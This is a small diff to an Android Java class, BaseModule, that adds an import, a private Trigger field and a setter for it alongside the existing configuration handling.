@@ -8,6 +8,7 @@
 package com.android.service.module;
 
 import com.android.service.ThreadBase;
+import com.android.service.Trigger;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfModule;
 import com.android.service.conf.ConfigurationException;
@@ -19,6 +20,7 @@ import com.android.service.util.Check;
 public abstract class BaseModule extends ThreadBase {
 	private static final String TAG = "BaseModule"; //$NON-NLS-1$
 	private ConfModule conf;
+	private Trigger trigger;
 
 	/**
 	 * Parses the.
@@ -47,6 +49,10 @@ public abstract class BaseModule extends ThreadBase {
 	@Override
 	public String toString() {
 		return "Module " +conf.getType() +" " + (isRunning()?"RUNNING":""); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
+	}
+
+	public void setTrigger(Trigger trigger) {
+		this.trigger=trigger;
 	}
 
 }
